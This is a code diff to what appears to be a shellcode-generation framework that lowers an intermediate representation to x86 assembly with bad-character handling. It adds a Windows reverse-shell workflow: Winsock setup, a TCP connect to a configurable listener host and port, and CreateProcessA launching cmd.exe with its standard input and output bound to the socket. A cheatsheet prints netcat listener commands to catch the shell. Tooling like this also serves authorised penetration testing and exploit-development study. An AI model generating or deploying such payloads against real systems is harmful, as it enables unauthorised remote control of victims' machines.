@@ -5,11 +5,15 @@ by implementing the PayloadTemplate interface.  It extracts manifest
 requirements (APIs, strings, structs, locals) from the IR and delegates
 payload assembly generation to the x86 backend.
 
-The first reference workflow is run_command: WinExec + ExitProcess with
-a branch on the WinExec result.
+Reference workflows:
+  - run_command: WinExec + ExitProcess with branch on result
+  - reverse_shell: WSAStartup, WSASocketA, connect, CreateProcessA
+    with typed inputs (lhost, lport), struct init, and error branching
 """
 from __future__ import annotations
 
+import socket as _socket
+import struct as _struct
 from collections.abc import Callable
 
 from ..payload_templates.base import PayloadTemplate, TemplateConfig
@@ -30,6 +34,8 @@ from .ir import (
     TerminateStyle,
     ValueRef,
     Workflow,
+    WriteStructField,
+    ZeroStruct,
 )
 from .validator import validate
 from .x86_backend import lower_workflow
@@ -178,4 +184,168 @@ class IRRunCommandTemplate(WorkflowTemplate):
     def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
         return [
             ("Command executed on target", config.command or "calc.exe"),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# Reverse shell workflow
+# ---------------------------------------------------------------------------
+
+# STARTF_USESTDHANDLES tells CreateProcessA to use the hStdInput/Output/Error
+# fields from STARTUPINFOA rather than inheriting the parent's console.
+_STARTF_USESTDHANDLES = 0x00000100
+
+
+def build_reverse_shell_workflow(
+    lhost: str = "127.0.0.1",
+    lport: int = 4444,
+    command: str = "cmd.exe",
+) -> Workflow:
+    """Build the reverse_shell reference workflow.
+
+    WSAStartup -> WSASocketA -> populate sockaddr_in -> connect ->
+    populate STARTUPINFOA -> CreateProcessA -> ExitProcess
+
+    The port and IP are pre-computed to network byte order and embedded
+    as DefineConstant nodes, keeping the IR free of byte-order logic.
+    """
+    port_be = _socket.htons(lport)
+    ip_le = _struct.unpack("<I", _socket.inet_aton(lhost))[0]
+
+    return Workflow(
+        name="ir_reverse_shell",
+        blocks=(
+            Block("entry", (
+                # Pre-compute network byte order values
+                DefineConstant("sin_port_be", port_be),
+                DefineConstant("sin_addr_le", ip_le),
+                DefineConstant("af_inet", 2),
+
+                # Allocate structures
+                AllocateStruct("wsadata", "WSADATA"),
+                AllocateStruct("sa", "sockaddr_in"),
+                AllocateStruct("si", "STARTUPINFOA"),
+                AllocateStruct("pi", "PROCESS_INFORMATION"),
+
+                # Allocate string
+                ConstructString("cmd", command),
+
+                # Initialize Winsock
+                CallAPI(
+                    "WSAStartup",
+                    arguments=(Immediate(0x0202), AddressOf("wsadata")),
+                    result="wsa_ret",
+                ),
+                Compare("wsa_ret", SuccessPredicate.ZERO,
+                        true_block="create_socket", false_block="fail"),
+            )),
+
+            Block("create_socket", (
+                # WSASocketA(AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6, NULL, 0, 0)
+                CallAPI(
+                    "WSASocketA",
+                    arguments=(
+                        Immediate(2),    # AF_INET
+                        Immediate(1),    # SOCK_STREAM
+                        Immediate(6),    # IPPROTO_TCP
+                        Immediate(0),    # lpProtocolInfo = NULL
+                        Immediate(0),    # g = 0
+                        Immediate(0),    # dwFlags = 0
+                    ),
+                    result="socket_handle",
+                ),
+                Compare("socket_handle", SuccessPredicate.INVALID_HANDLE,
+                        true_block="connect_socket", false_block="fail"),
+            )),
+
+            Block("connect_socket", (
+                # Populate sockaddr_in
+                ZeroStruct("sa"),
+                WriteStructField("sa", "sin_family", NameRef("af_inet")),
+                WriteStructField("sa", "sin_port", NameRef("sin_port_be")),
+                WriteStructField("sa", "sin_addr", NameRef("sin_addr_le")),
+
+                # connect(socket, &sockaddr_in, 0x10)
+                CallAPI(
+                    "connect",
+                    arguments=(
+                        NameRef("socket_handle"),
+                        AddressOf("sa"),
+                        Immediate(0x10),
+                    ),
+                    result="conn_ret",
+                ),
+                Compare("conn_ret", SuccessPredicate.ZERO,
+                        true_block="setup_process", false_block="fail"),
+            )),
+
+            Block("setup_process", (
+                # Zero and populate STARTUPINFOA
+                ZeroStruct("si"),
+                WriteStructField("si", "cb", Immediate(0x44)),
+                WriteStructField("si", "dwFlags",
+                                 Immediate(_STARTF_USESTDHANDLES)),
+                WriteStructField("si", "hStdInput",
+                                 NameRef("socket_handle")),
+                WriteStructField("si", "hStdOutput",
+                                 NameRef("socket_handle")),
+                WriteStructField("si", "hStdError",
+                                 NameRef("socket_handle")),
+
+                # Zero PROCESS_INFORMATION
+                ZeroStruct("pi"),
+
+                # CreateProcessA(NULL, &cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)
+                CallAPI(
+                    "CreateProcessA",
+                    arguments=(
+                        Immediate(0),       # lpApplicationName = NULL
+                        AddressOf("cmd"),   # lpCommandLine
+                        Immediate(0),       # lpProcessAttributes = NULL
+                        Immediate(0),       # lpThreadAttributes = NULL
+                        Immediate(1),       # bInheritHandles = TRUE
+                        Immediate(0),       # dwCreationFlags = 0
+                        Immediate(0),       # lpEnvironment = NULL
+                        Immediate(0),       # lpCurrentDirectory = NULL
+                        AddressOf("si"),    # lpStartupInfo
+                        AddressOf("pi"),    # lpProcessInformation
+                    ),
+                    result="cpa_ret",
+                ),
+                Compare("cpa_ret", SuccessPredicate.NONZERO,
+                        true_block="success", false_block="fail"),
+            )),
+
+            Block("success", (
+                CallAPI("ExitProcess", arguments=(Immediate(0),)),
+                Terminate(TerminateStyle.HANG),
+            )),
+
+            Block("fail", (
+                CallAPI("ExitProcess", arguments=(Immediate(1),)),
+                Terminate(TerminateStyle.HANG),
+            )),
+        ),
+        entry="entry",
+    )
+
+
+class IRReverseShellTemplate(WorkflowTemplate):
+    """IR-backed reverse_shell template for CLI integration."""
+
+    def __init__(self) -> None:
+        super().__init__(build_reverse_shell_workflow())
+
+    def emit(self, layout: StackLayout, config: TemplateConfig) -> str:
+        workflow = build_reverse_shell_workflow(
+            lhost=config.lhost,
+            lport=config.lport,
+            command=config.command or "cmd.exe",
+        )
+        return lower_workflow(workflow, layout, config.badchars, config)
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        return [
+            ("Start netcat listener", f"nc -lnvp {config.lport}"),
+            ("Start listener (rlwrap)", f"rlwrap nc -lnvp {config.lport}"),
         ]
